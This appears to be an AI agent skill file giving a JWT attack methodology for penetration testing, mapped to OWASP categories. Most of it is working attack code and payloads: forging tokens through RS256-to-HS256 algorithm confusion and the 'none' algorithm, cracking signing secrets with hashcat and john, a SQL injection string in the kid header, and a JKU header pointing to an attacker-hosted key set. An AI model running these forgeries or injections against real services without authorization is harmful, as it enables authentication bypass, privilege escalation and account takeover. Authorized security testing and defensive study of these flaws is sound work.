---
name: jwt
description: JWT (JSON Web Token) attack methodology. Covers algorithm confusion (RS256→HS256), none algorithm, weak secret cracking, kid injection, JKU header forgery, and claims manipulation.
version: 1.0.0
license: Apache-2.0
---

# JWT Attacks

## Detection and Decoding

```bash
# Decode without verification
echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null
# Or use jwt.io in browser
```

## Attack 1 — Algorithm Confusion (RS256 → HS256)

If the server signs with RS256 (asymmetric) and validates by checking the `alg` header:

```python
import jwt
import requests

# Get public key from server (often exposed at /jwks.json or /.well-known/jwks.json)
public_key = requests.get("https://target.com/.well-known/jwks.json").text

# Sign a forged token with the public key as the HMAC secret
forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)
```

## Attack 2 — None Algorithm

```python
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
payload = base64.b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).decode().rstrip("=")
forged = f"{header}.{payload}."
```

## Attack 3 — Weak Secret Cracking

```bash
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
# Or john
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
```

## Attack 4 — kid (Key ID) Injection

If `kid` is used in a SQL/file path lookup:

```json
{
  "alg": "HS256",
  "kid": "' UNION SELECT 'attacker_secret' --"
}
```

Sign with `attacker_secret` — the server queries for the key using the injected SQL.

## Attack 5 — JKU Header Forgery

```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json"
}
```

Host a JWKS at attacker.com with your own RSA key pair. Sign the JWT with your private key.

## Tools

- [jwt_tool](https://github.com/ticarpi/jwt_tool) — comprehensive JWT testing
- [jwt.io](https://jwt.io) — decode and inspect
- Burp Suite JWT Editor extension

## OWASP Mapping

- A02:2021 — Cryptographic Failures
- A07:2021 — Identification and Authentication Failures
